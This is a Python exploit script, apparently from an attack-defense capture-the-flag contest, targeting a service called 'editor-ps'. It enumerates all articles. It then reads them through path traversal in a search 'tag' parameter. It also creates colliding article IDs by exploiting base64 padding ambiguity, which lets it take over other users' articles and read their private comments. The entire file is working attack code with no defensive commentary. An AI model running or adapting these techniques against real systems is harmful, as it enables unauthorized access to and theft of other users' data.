import base64
import binascii
import os

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

SERVICENAME = "editor-ps"
PORT = 20005
team_addr = "6.6.0.2"


def generate_rand(n=16):
    return binascii.b2a_hex(os.urandom(n)).decode()


password = generate_rand()

r = requests.get("https://{}:{}/listAllArticles".format(team_addr, PORT), verify=False)
articles = [a.split(":", 1)[0] for a in r.json()]

# Save states to reduce load
for article_id in articles:
    article = requests.post("https://{}:{}/search".format(team_addr, PORT),
                            data={"tag": f"tag/../../articles/{article_id}"}, verify=False).json()
    print(article['tags'], article['content'])

    bts = article_id.encode()
    new_article_id = bts[:-2] + bytes([bts[-2] + 1]) + bytes([bts[-1]])

    try:
        if base64.b64decode(new_article_id) != base64.b64decode(article_id):
            new_article_id = bts[:-2] + bytes([bts[-2] - 1]) + bytes([bts[-1]])
            if base64.b64decode(new_article_id) != base64.b64decode(article_id):
                print(f"Failed: {article_id}")
                continue
    except Exception as e:
        continue

    r = requests.post("https://{}:{}/addArticle".format(team_addr, PORT), verify=False, data={
        "password": password, "title": "", "content": "", "article_id": new_article_id.decode().rstrip("=")
    })
    if r.status_code == 400:
        continue

    r = requests.post("https://{}:{}/getComments".format(team_addr, PORT), verify=False, data={
        "password": password, "article_id": new_article_id.decode().rstrip("=")
    })

    if len(r.text):
        print(r.text)
